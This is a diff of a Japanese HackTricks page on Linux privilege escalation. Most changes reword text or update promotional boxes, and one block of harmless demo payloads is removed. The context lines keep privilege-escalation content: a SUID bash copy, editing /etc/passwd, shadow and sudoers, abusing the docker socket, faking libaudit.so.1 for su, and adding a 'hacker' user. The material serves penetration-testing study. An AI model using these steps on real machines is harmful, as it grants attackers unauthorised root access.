@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでAWSハッキングを学ぶ**</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
-* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出して、あなたのハッキングトリックを共有してください。
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションです。
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう。
+* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
@@ -18,60 +18,6 @@ cp /bin/bash /tmp/b && chmod +s /tmp/b
 /bin/b -p #Maintains root privileges from suid, working in debian & buntu
 ```
 ## C
-
-### Payloads to Execute
-
-#### Bash
-
-```bash
-bash -c 'echo "I am a payload"'
-```
-
-#### Python
-
-```python
-python -c 'print("I am a payload")'
-```
-
-#### Perl
-
-```perl
-perl -e 'print "I am a payload\n";'
-```
-
-#### Ruby
-
-```ruby
-ruby -e 'puts "I am a payload"'
-```
-
-#### PHP
-
-```php
-php -r 'echo "I am a payload\n";'
-```
-
-#### Node.js
-
-```javascript
-node -e 'console.log("I am a payload")'
-```
-
-#### Java
-
-```java
-java -jar payload.jar
-```
-
-#### C
-
-```c
-#include <stdio.h>
-int main() {
-    printf("I am a payload\n");
-    return 0;
-}
-```
 ```c
 //gcc payload.c -o payload
 int main(void){
@@ -114,12 +60,12 @@ return 0;
 
 * パスワード付きユーザーを _/etc/passwd_ に追加
 * _/etc/shadow_ 内のパスワードを変更
-* _/etc/sudoers_ にsudo権限を持つユーザーを追加
-* 通常 _/run/docker.sock_ や _/var/run/docker.sock_ にあるdockerソケットを悪用
+* _/etc/sudoers_ にユーザーを追加
+* 通常 _/run/docker.sock_ や _/var/run/docker.sock_ にある docker ソケットを悪用
 
 ### ライブラリの上書き
 
-バイナリによって使用されるライブラリをチェックし、この場合は `/bin/su` をチェックします：
+いくつかのバイナリで使用されているライブラリをチェックします。この場合は `/bin/su` を使用します：
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -131,8 +77,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-この場合は、`/lib/x86_64-linux-gnu/libaudit.so.1` をなりすますことを試してみましょう。\
-したがって、**`su`** バイナリによって使用されるこのライブラリの関数をチェックします：
+この場合は、`/lib/x86_64-linux-gnu/libaudit.so.1` を偽装しようとしています。\
+したがって、**`su`** バイナリで使用されているこのライブラリの関数をチェックします:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -140,7 +86,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-以下のシンボル `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` および `audit_fd` はおそらく libaudit.so.1 ライブラリから来ています。libaudit.so.1 は悪意のある共有ライブラリによって上書きされるため、これらのシンボルは新しい共有ライブラリに存在する必要があります。そうでないと、プログラムはシンボルを見つけることができずに終了します。
+次のシンボル `audit_open`、`audit_log_acct_message`、`audit_log_acct_message`、および `audit_fd` はおそらく libaudit.so.1 ライブラリから来ています。libaudit.so.1 は悪意のある共有ライブラリによって上書きされるため、これらのシンボルは新しい共有ライブラリに存在する必要があります。さもないと、プログラムはシンボルを見つけることができずに終了します。
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -182,12 +128,12 @@ echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysal
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？**HackTricksで会社を宣伝**してみたいですか？または**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。当社の独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクション
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬 Discordグループ](https://emojipedia.org/speech-balloon/)に参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
+* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 * **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
